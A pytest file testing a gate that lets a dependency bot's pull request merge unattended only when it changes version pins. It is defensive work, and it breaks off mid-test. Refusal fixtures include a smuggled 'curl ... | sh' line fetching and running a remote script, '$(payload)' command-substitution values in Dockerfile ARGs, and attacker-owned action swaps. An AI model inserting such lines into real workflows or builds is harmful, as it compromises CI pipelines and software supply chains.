"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import difflib
import subprocess
import sys

import pytest
from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

# A 40 character hex string, the shape of a GitHub Actions commit pin.
SHA = "a" * 40
OTHER_SHA = "b" * 40


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def _check_workflow(tmp_path, body: str) -> subprocess.CompletedProcess:
    """Grade a workflow diff against a real base built from its own lines.

    `body` is hunk lines as `_diff` takes them. The base is its context and
    removed lines, the head its context and added lines, so the gate reads
    the file whole the way it does for a real pull request; a hand-written
    diff with no base behind it is refused outright (see `parse`).
    """
    before = after = ""
    for line in body.splitlines():
        tag, text = line[:1], line[1:]
        if tag in (" ", "-"):
            before += text + "\n"
        if tag in (" ", "+"):
            after += text + "\n"
    return _check_in_repo(tmp_path, before, after)


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_a_github_action_sha_bump(tmp_path):
    # A real `gh pr diff` always carries a line or two of unchanged context
    # around a change; the leading ` - name: Checkout` here mirrors that,
    # since _in_block_scalar conservatively refuses a candidate pin when the
    # diff shows it no visible context at all to judge from.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@{SHA} # v7\n"
        f"+        uses: actions/checkout@{OTHER_SHA} # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_github_action_pin(tmp_path):
    # pinDigests adding a SHA to a previously unpinned action, ported from
    # docker-torrent-box-with-vpn's own PR #178/#183: there is no prior SHA
    # to compare against, and ACTION_SHA alone had no pattern for that
    # transition.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@v7\n"
        f"+        uses: actions/checkout@{SHA} # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_pin_as_a_yaml_list_item(tmp_path):
    # A step is also legally written as a bare list item, `- uses: ...`,
    # with no name: line above it. The anchor has to allow the optional
    # marker, not just plain indentation.
    result = _check_workflow(
        tmp_path,
        f"     steps:\n"
        f"-      - uses: actions/checkout@v7\n"
        f"+      - uses: actions/checkout@{SHA} # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_an_uppercase_first_time_pin(tmp_path):
    # GitHub resolves a uses: SHA the same way regardless of case.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@v7\n"
        f"+        uses: actions/checkout@{SHA.upper()} # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_sha_bump_that_also_moves_the_version_comment(tmp_path):
    # The shape every real Renovate action bump has, and the one this script
    # refused until ACTION_SHA learned to fold the comment into the same
    # placeholder: the SHA moves and the trailing release comment moves with
    # it, because the tag the SHA was resolved from changed too. The fixtures
    # above pinned `# v7` on both sides, so nothing here ever exercised it.
    #
    # Measured on #105, a github/codeql-action bump across three workflows,
    # which sat refused with "removed a line that was not re-added" for every
    # pin in it. No action SHA bump had ever reached an unattended merge in
    # this repository before that was fixed.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@{SHA} # v4.37.9\n"
        f"+        uses: actions/checkout@{OTHER_SHA} # v4.38.0\n",
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_first_time_pin_that_arrives_with_no_version_comment(tmp_path):
    # pinDigests writes the release comment in the same edit that adds the
    # SHA, so a first-time pin carrying no comment is not a shape a clean
    # bump produces. It reads as structural and waits for a person, the same
    # fail closed direction every other shape in this file takes.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@v7\n"
        f"+        uses: actions/checkout@{SHA}\n",
    )
    assert result.returncode == 1


def test_refuses_trailing_text_changing_beside_a_real_sha_bump(tmp_path):
    # Only a release token immediately after the SHA is folded into the
    # placeholder. Anything else trailing the pin stays literal, so an edit
    # hidden there is still caught even though the SHA itself moved
    # legitimately.
    result = _check_workflow(
        tmp_path,
        f"       - name: Checkout\n"
        f"-        uses: actions/checkout@{SHA} # v7 keep\n"
        f"+        uses: actions/checkout@{OTHER_SHA} # v8 changed\n",
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_with_no_visible_context():
    # _in_block_scalar has nothing to judge from when the diff shows no
    # line shallower than the change at all (a synthetic edge case a real
    # gh pr diff essentially never produces, since it always carries a
    # line or two of context), and conservatively refuses rather than
    # guess, the same fail closed direction every other shape here takes.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"-        uses: actions/checkout@v7\n"
            f"+        uses: actions/checkout@{SHA} # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin(tmp_path):
    # A third finding on this pattern: RELEASE accepts any alphanumeric
    # run, hex or not, so a 40 character token that is not real hex slips
    # past ACTION_SHA (not hex) and was accepted here regardless, since
    # nothing checked that a first-time pin's target was ever a real SHA.
    # 40 characters is the shape ACTION_SHA exists to own exclusively, so
    # anything that length reaching this pattern is refused outright.
    fake = "0" + "z" * 39
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@v7\n+        uses: actions/checkout@{fake}\n",
    )
    assert result.returncode == 1


def test_accepts_a_pre_commit_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev: v2.2.3\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_tool_versions_file_entirely():
    # asdf was removed from this repository on 2026-09-19 and `.tool-versions`
    # deleted with it, so the file is no longer a pin surface. A bot proposing
    # one is proposing to reintroduce a version manager, which is a decision
    # for a person and not a version bump. This used to be
    # test_accepts_a_tool_versions_bump.
    result = _check(
        _diff(
            ".tool-versions",
            "-pre-commit 4.6.2\n+pre-commit 4.7.0\n",
        )
    )
    assert result.returncode == 1, result.stdout
    assert "not a dependency pin file" in result.stdout


def test_accepts_the_renovate_annotated_alpine_arg():
    # ALPINE_VERSION is the one ARG in the Dockerfile a renovate: comment
    # anchors, and it is the only variable Renovate's own manager may bump.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION=3.24\n+ARG ALPINE_VERSION=3.25\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_an_apk_pin_annotated_arg():
    # GOCRYPTFS_VERSION carries the distinct `# apk-pin:` marker
    # resolve-apk-pins.yml is anchored to, not `# renovate:`; this is the
    # marker this script's own APK_PIN_ANNOTATION is built to recognize.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG GOCRYPTFS_VERSION=2.6\n+ARG GOCRYPTFS_VERSION=2.7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_every_apk_pin_annotated_arg_bumped_together():
    # resolve-apk-pins.yml can touch any subset of the seven in one commit,
    # not just one at a time.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG BASH_VERSION=5.3\n+ARG BASH_VERSION=5.4\n"
            "-ARG LESS_VERSION=702\n+ARG LESS_VERSION=703\n"
            "-ARG OPENSSH_VERSION=10.3\n+ARG OPENSSH_VERSION=10.4\n"
            "-ARG RSYNC_VERSION=3.5\n+ARG RSYNC_VERSION=3.6\n"
            "-ARG SSHFS_VERSION=3.7\n+ARG SSHFS_VERSION=3.8\n"
            "-ARG VIM_VERSION=9.2\n+ARG VIM_VERSION=9.3\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_alpine_and_apk_pin_bumps_together_in_one_diff():
    # The real shape resolve-apk-pins.yml produces: its commit lands on top
    # of Renovate's own ALPINE_VERSION commit, so the pull request's
    # cumulative diff carries both a renovate: annotated bump and one or
    # more apk-pin: annotated bumps at once.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION=3.24\n+ARG ALPINE_VERSION=3.25\n"
            "-ARG GOCRYPTFS_VERSION=2.6\n+ARG GOCRYPTFS_VERSION=2.7\n",
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# Refused: a real pin surface, but not one this repository's bots manage
# ---------------------------------------------------------------------------


def test_refuses_docker_image_tag_version_despite_looking_like_a_pin():
    # DOCKER_IMAGE_TAG_VERSION is a local build tag with no upstream to
    # track, it lives in .env.example, and no annotation of either kind
    # (renovate: or apk-pin:) has ever sat above it. .env.example came off
    # ALLOWED_PATHS entirely when the eight real pins moved into the
    # Dockerfile, so this is now refused on the path alone; it stays as a
    # test because the file returning to the allowlist must not quietly make
    # this line eligible again.
    result = _check(
        _diff(
            ".env.example",
            '-DOCKER_IMAGE_TAG_VERSION="1.0.0"\n+DOCKER_IMAGE_TAG_VERSION="1.0.1"\n',
        )
    )
    assert result.returncode == 1, result.stdout
    assert "not a dependency pin file" in result.stdout


def test_refuses_an_unannotated_arg_in_the_dockerfile():
    # An ARG the Dockerfile does not annotate, in the file that is on the
    # allowlist: the per-name gate, not the path, is what has to refuse this.
    # A script that normalized any `ARG *_VERSION=` line would wave it
    # through, which is exactly the widening the two markers exist to prevent.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG UNANNOTATED_VERSION=1.0.0\n+ARG UNANNOTATED_VERSION=1.0.1\n",
        )
    )
    assert result.returncode == 1, result.stdout
    assert "was not a version bump" in result.stdout


def test_refuses_a_non_pin_line_in_the_dockerfile():
    # The Dockerfile is on the allowlist for its ARG pins only. Every other
    # instruction in it is executable content, and a bot editing one is the
    # shape this whole script exists to catch.
    result = _check(
        _diff(
            "Dockerfile",
            "-USER 1000\n+USER 0\n",
        )
    )
    assert result.returncode == 1, result.stdout
    assert "was not a version bump" in result.stdout


def test_refuses_a_pip_pin_in_tests_requirements():
    # No manager here reads this file: Renovate's enabledManagers is
    # custom.regex, github-actions and pre-commit, none of which are a pip
    # manager, so a change here from a bot would not be a real shape and is
    # not on the allowlist.
    result = _check(
        _diff(
            "tests/requirements.txt",
            "-pytest>=9.1.1\n+pytest>=9.2.0\n",
        )
    )
    assert result.returncode == 1, result.stdout
    assert "not a dependency pin file" in result.stdout


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump(tmp_path):
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@{SHA} # v7\n"
        f"+        uses: actions/checkout@{OTHER_SHA} # v7\n"
        "+          curl -s https://example.invalid/x.sh | sh\n",
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version(tmp_path):
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@{SHA}\n"
        f"+        uses: attacker/checkout@{SHA}\n",
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_with_a_swapped_owner(tmp_path):
    # The dependency name stays literal to the left of the `@` for this
    # shape exactly as it does for every other pin type here.
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@v7\n+        uses: evil/checkout@{SHA}\n",
    )
    assert result.returncode == 1


def test_refuses_a_run_step_version_bump_disguised_as_a_first_time_pin(tmp_path):
    # BARE_ACTION_VERSION requires a uses: field and an owner/repo
    # coordinate, not bare `@RELEASE` anywhere on the line: a run: step's
    # trailing tool@v7 must not normalize the same way a first-time action
    # pin does, or that line could grow an unrelated-looking SHA and still
    # read as pin-only.
    result = _check_workflow(
        tmp_path,
        f"-          run: tool@v7\n+          run: tool@{SHA}\n",
    )
    assert result.returncode == 1


def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin(tmp_path):
    # CodeRabbit's follow-up finding: \buses: is a word-boundary check, not
    # a position check, so it matched the substring "uses:" anywhere on the
    # line, including inside a run: step's own text. BARE_ACTION_VERSION now
    # anchors to the start of the line, so a run: step that happens to
    # contain the literal text "uses: owner/repo@version" cannot disguise
    # itself as a real uses: field this way.
    result = _check_workflow(
        tmp_path,
        f"-          run: uses: actions/checkout@v7\n"
        f"+          run: uses: actions/checkout@{SHA}\n",
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    # The Makefile is the natural neighbour of the Dockerfile here: it also
    # names these version variables (as optional --build-arg overrides), and
    # it is not a file any bot manages.
    result = _check(
        _diff(
            "Makefile",
            "-\t\t--tag ${DOCKER_IMAGE_TAG_NAME} \\\n"
            "+\t\t--tag ${DOCKER_IMAGE_TAG_NAME}:evil \\\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    # Both sides are on the allowlist on purpose. Renaming across it would
    # make this pass because the path was refused, proving nothing about
    # rename detection, which is what this test is for.
    result = _check(
        "diff --git a/.pre-commit-config.yaml b/.pre-commit-config.yaml-old\n"
        "--- a/.pre-commit-config.yaml\n"
        "+++ b/.pre-commit-config.yaml-old\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout


# ---------------------------------------------------------------------------
# Fails closed: the ways an unreadable diff could have passed for a clean one
# ---------------------------------------------------------------------------


def test_refuses_output_with_no_file_header():
    # Truncated or binary output parses into no files at all. Reporting that
    # as "nothing to object to" would approve a diff nobody managed to read.
    result = _check("Binary files a/x.png and b/x.png differ\n")
    assert result.returncode == 1
    assert "no file headers" in result.stdout


def test_refuses_a_file_whose_lines_could_not_be_read():
    result = _check(
        "diff --git a/Dockerfile b/Dockerfile\nindex 1111111..2222222 100644\n"
    )
    assert result.returncode == 1
    assert "no readable changed lines" in result.stdout


def test_counts_an_added_line_that_looks_like_a_file_header():
    # `+++x` inside a hunk is an added line reading `++x`. Skipping it as a
    # ---/+++ header would drop it from the comparison, so the smuggled line
    # would never be seen.
    # On an allowed, graded surface: on a refused path this would pass
    # because of the allowlist and never exercise the header logic at all.
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev: v2.2.3\n+++PATH=/tmp/evil\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


# ---------------------------------------------------------------------------
# Only a number in a pin position counts as a version, and only on the
# annotated Dockerfile ARG lines this script is allowed to touch at all
# ---------------------------------------------------------------------------


def test_refuses_a_numeric_change_on_an_unannotated_dockerfile_line():
    # A number changing on a line no marker annotates. A rule keyed only on
    # "some digits changed" would have accepted this; it has to be a value in
    # a pin position on an annotated ARG, or it is a structural change.
    result = _check(_diff("Dockerfile", "-USER 1000\n+USER 1001\n"))
    assert result.returncode == 1


def test_refuses_a_changed_yaml_number(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-    timeout-minutes: 8\n+    timeout-minutes: 600\n",
    )
    assert result.returncode == 1


def test_refuses_a_prefix_that_changes_shape():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev v2.2.2\n",
        )
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# A pin token has to be a real, immutable release, not any tag-shaped word
# ---------------------------------------------------------------------------


def test_refuses_a_pre_commit_rev_trading_a_release_for_a_floating_branch():
    # `main` moves. Waving this through would let a compromised bot swap an
    # immutable pin for a ref that can point anywhere after the diff is
    # already merged, with nothing left in the diff itself to catch it.
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev: main\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_github_action_sha_trading_for_a_floating_tag(tmp_path):
    # Every action in this repository is pinned to a full commit SHA, never a
    # tag; accepting one here would be accepting the shape a compromised
    # dependency bot run would take to stop being pinned at all.
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@{SHA}\n"
        "+        uses: actions/checkout@main\n",
    )
    assert result.returncode == 1, result.stdout


def test_refuses_an_unannotated_sibling_bumped_alongside_the_annotated_line():
    # Every `ARG *_VERSION=` line in the Dockerfile is annotated today, by one
    # marker or the other, so the unannotated sibling here is a hypothetical
    # one a bot added itself. A diff that bumps the real, annotated
    # ALPINE_VERSION line cleanly must still be refused if it smuggles a bump
    # to an unannotated sibling in alongside it: per-name gating has to hold
    # even when several version-shaped lines change in the same file at once.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION=3.24\n"
            "+ARG ALPINE_VERSION=3.25\n"
            "-ARG SMUGGLED_VERSION=1.0.0\n"
            "+ARG SMUGGLED_VERSION=1.0.1\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_non_version_payload_in_an_annotated_arg():
    # ALPINE_VERSION is annotated and eligible for a bump, but the value still
    # has to be a release on its own; a script that substituted on any value,
    # version-shaped or not, would wave this through.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION=3.24\n+ARG ALPINE_VERSION=$(payload)\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_non_version_payload_in_an_apk_pin_annotated_arg():
    # Same requirement, the other marker: apk-pin: annotation makes
    # GOCRYPTFS_VERSION eligible for a bump, not eligible for any edit at
    # all.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG GOCRYPTFS_VERSION=2.6\n+ARG GOCRYPTFS_VERSION=$(payload)\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_an_annotated_arg_losing_its_default():
    # `ARG ALPINE_VERSION=3.24` becoming a bare `ARG ALPINE_VERSION` is not a
    # version bump, it is the pin being deleted: the Dockerfile would then
    # build `alpine:` unless something passed a --build-arg, which is the
    # failure mode baking the defaults in was meant to remove.
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION=3.24\n+ARG ALPINE_VERSION\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar(tmp_path):
    # A CodeRabbit review found BLOCK_SCALAR_OPENER itself was still too
    # narrow: it required a colon before the scalar indicator, so a bare
    # sequence-item header with no key in front, `- |`, was not
    # recognized as opening a block scalar. A uses: line nested under one
    # then reached pin normalization as ordinary YAML structure instead
    # of literal block scalar content. Confirmed exploitable before
    # BLOCK_SCALAR_OPENER also matched a standalone sequence-item header.
    result = _check_workflow(
        tmp_path,
        "        scripts:\n"
        "          - |\n"
        "-            uses: fake/action@v7\n"
        "+            uses: fake/action@v8\n",
    )
    assert result.returncode == 1, result.stdout


# ---------------------------------------------------------------------------
# Whole-file block scalar judgment: a real git diff against a real base
# ---------------------------------------------------------------------------

STEP_WITH_COMMENT = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Upload the scan\n"
    "        # A comment between the step's name and its uses: line, long\n"
    "        # enough that three lines of diff context above the pin never\n"
    "        # reach anything shallower than it.\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
    "        with:\n"
    "          sarif_file: scan.sarif\n"
)

NESTED_IN_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: |\n"
    "          if true; then\n"
    "            uses: fake/action@{sha} # v4\n"
    "          fi\n"
)


def _git(repo, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", *args],
        capture_output=True,
        text=True,
        check=True,
    ).stdout


def _check_in_repo(tmp_path, before: str, after: str, *, base: str | None = None):
    """Commit `before`, diff it against `after`, and grade that diff with a
    copy of the script whose checkout holds `base` (default: `before`)."""
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.parent.mkdir(parents=True)
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / SCRIPT.name).write_bytes(SCRIPT.read_bytes())
    (tmp_path / "Dockerfile").write_bytes((REPO_ROOT / "Dockerfile").read_bytes())
    _git(tmp_path, "init", "-q")
    workflow.write_text(before)
    _git(tmp_path, "add", ".")
    _git(tmp_path, "commit", "-q", "-m", "base")
    workflow.write_text(after)
    diff = _git(tmp_path, "diff")
    workflow.write_text(before if base is None else base)
    return subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def test_accepts_a_pin_whose_step_name_sits_above_a_comment(tmp_path):
    # ivan-pinatti-labs/rsync-crypt#105: the three lines of context above
    # the pin are all comments at its own indentation, so the diff alone
    # shows nothing shallower and the fallback refuses. Read whole, the
    # file proves the line is ordinary YAML structure.
    result = _check_in_repo(
        tmp_path,
        STEP_WITH_COMMENT.format(sha=SHA),
        STEP_WITH_COMMENT.format(sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_uses_line_nested_deep_inside_a_run_block(tmp_path):
    # The gap `_in_block_scalar` documents: judged from context, the
    # nearest shallower line is `if true; then`, which is not an opener,
    # so the fallback would read this shell text as a step. The whole file
    # shows it sits inside `run: |`.
    result = _check_in_repo(
        tmp_path,
        NESTED_IN_RUN.format(sha=SHA),
        NESTED_IN_RUN.format(sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_to_the_diff_when_main_has_moved_the_file(tmp_path):
    # The checkout no longer matches the diff's base blob, so nothing read
    # from it can be trusted to describe this diff: the context judgment
    # applies again, and it refuses the #105 shape as it always did.
    result = _check_in_repo(
        tmp_path,
        STEP_WITH_COMMENT.format(sha=SHA),
        STEP_WITH_COMMENT.format(sha=OTHER_SHA),
        base=STEP_WITH_COMMENT.format(sha=SHA) + "# moved on main\n",
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_when_the_hunks_disagree_with_the_base(tmp_path):
    # A matching blob id with a context line the base does not have means
    # the diff was not taken against this file; the whole-file view is
    # discarded rather than trusted, and the context judgment refuses.
    before = STEP_WITH_COMMENT.format(sha=SHA)
    after = STEP_WITH_COMMENT.format(sha=OTHER_SHA)
    assert _check_in_repo(tmp_path, before, after).returncode == 0
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.write_text(after)
    diff = _git(tmp_path, "diff").replace("shallower than it.", "else at all.")
    workflow.write_text(before)
    result = subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_when_a_hunk_is_shorter_than_its_header(tmp_path):
    # Valid context, but the header declares more lines than the body
    # carries: a truncated diff. The whole-file view is discarded rather
    # than filled in from the base, and the context judgment refuses.
    before = STEP_WITH_COMMENT.format(sha=SHA)
    after = STEP_WITH_COMMENT.format(sha=OTHER_SHA)
    assert _check_in_repo(tmp_path, before, after).returncode == 0
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.write_text(after)
    lines = _git(tmp_path, "diff").splitlines()
    diff = "\n".join(lines[:-1]) + "\n"
    workflow.write_text(before)
    result = subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert result.returncode == 1, result.stdout


ANCHORED_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: {props} |2-\n"
    "            uses: fake/action@{sha} # v4\n"
)

DASH_NAME_SIBLING = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: |\n"
    "          Upload the scan\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&body", "!!str"])
def test_refuses_a_uses_line_inside_an_anchored_or_tagged_run_block(tmp_path, props):
    # YAML allows an anchor or a tag between the colon and the block scalar
    # indicator, and `run: &body |2-` opens a scalar just as `run: |` does.
    # BLOCK_SCALAR_OPENER missed both until a CodeRabbit review found it.
    result = _check_in_repo(
        tmp_path,
        ANCHORED_RUN.format(props=props, sha=SHA),
        ANCHORED_RUN.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


@pytest.mark.parametrize("props", ["&body", "!!str"])
def test_refuses_an_anchored_or_tagged_run_block_from_context(props):
    # The same shape judged from the diff alone, as when main has moved on.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"         run: {props} |2-\n"
            f"-            uses: fake/action@{SHA} # v4\n"
            f"+            uses: fake/action@{OTHER_SHA} # v4\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_accepts_a_uses_line_beside_a_dash_name_block(tmp_path):
    # For `- name: |` the scalar's floor is the key's column, not the dash's:
    # a `uses:` at that column is the step's next key, which YAML (PyYAML
    # confirms) reads as a sibling rather than as scalar content.
    result = _check_in_repo(
        tmp_path,
        DASH_NAME_SIBLING.format(sha=SHA),
        DASH_NAME_SIBLING.format(sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


PROPERTIES_ON_STEP = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - {props} name: |\n"
    "          Upload the scan\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&step", "!!map"])
def test_accepts_a_uses_line_beside_an_anchored_or_tagged_step(tmp_path, props):
    # Properties leading a compact mapping, `- &step name: |`, belong to the
    # mapping, which starts at their column; `uses:` there is a sibling key
    # (PyYAML confirms), not scalar content.
    result = _check_in_repo(
        tmp_path,
        PROPERTIES_ON_STEP.format(props=props, sha=SHA),
        PROPERTIES_ON_STEP.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


SPLIT_INDICATOR_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: {props}\n"
    "          |\n"
    "          uses: fake/action@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&body", "!!str", ""])
def test_refuses_a_uses_line_under_a_standalone_indicator(tmp_path, props):
    # `run: &body` (or a bare `run:`) followed by an indented `|` is a block
    # scalar too, and its content may sit at the `|` line's own column
    # (PyYAML confirms). Raised by CodeRabbit on
    # ivan-pinatti-labs/pre-commit-checklists#50.
    result = _check_in_repo(
        tmp_path,
        SPLIT_INDICATOR_RUN.format(props=props, sha=SHA),
        SPLIT_INDICATOR_RUN.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


@pytest.mark.parametrize("props", ["&body", "!!str", ""])
def test_refuses_a_standalone_indicator_from_context(props):
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"         run: {props}\n"
            "           |\n"
            f"-          uses: fake/action@{SHA} # v4\n"
            f"+          uses: fake/action@{OTHER_SHA} # v4\n",
        )
    )
    assert result.returncode == 1, result.stdout


SEQUENCE_ITEM_SPLIT = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run:\n"
    "          {item}\n"
    "            |\n"
    "            uses: fake/action@{sha} # v4\n"
)

COMMENT_BEFORE_OPENER = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        # note: |\n"
    "        run: &body |-\n"
    "          uses: fake/action@{sha} # v4\n"
)


@pytest.mark.parametrize("item", ["- &body", "- !!str", "- run:"])
def test_refuses_a_uses_line_under_a_sequence_item_split_indicator(tmp_path, item):
    # A lone indicator's owner, and so its content's floor, depends on lines
    # above it; `- &body` then `|` makes the item itself the scalar. Every
    # line after a lone indicator now counts as content. Raised by CodeRabbit
    # across the ports of this script and confirmed by fuzzing against PyYAML.
    result = _check_in_repo(
        tmp_path,
        SEQUENCE_ITEM_SPLIT.format(item=item, sha=SHA),
        SEQUENCE_ITEM_SPLIT.format(item=item, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_uses_line_under_an_opener_after_a_comment(tmp_path):
    # A comment ending in `: |` is not an opener. Read as one, it swallowed
    # the real `run: &body |-` below it, found by fuzzing against PyYAML.
    result = _check_in_repo(
        tmp_path,
        COMMENT_BEFORE_OPENER.format(sha=SHA),
        COMMENT_BEFORE_OPENER.format(sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_nested_run_line_with_no_base_to_read():
    # With no `index` line the base cannot be proven, and a workflow line
    # is then never graded as a pin: the documented gap of judging from
    # context (a `uses:` under an `if` inside `run: |`) cannot recur.
    before = NESTED_IN_RUN.format(sha=SHA)
    after = NESTED_IN_RUN.format(sha=OTHER_SHA)
    path = ".github/workflows/scan.yml"
    body = "".join(
        difflib.unified_diff(
            [line + "\n" for line in before.splitlines()],
            [line + "\n" for line in after.splitlines()],
            f"a/{path}",
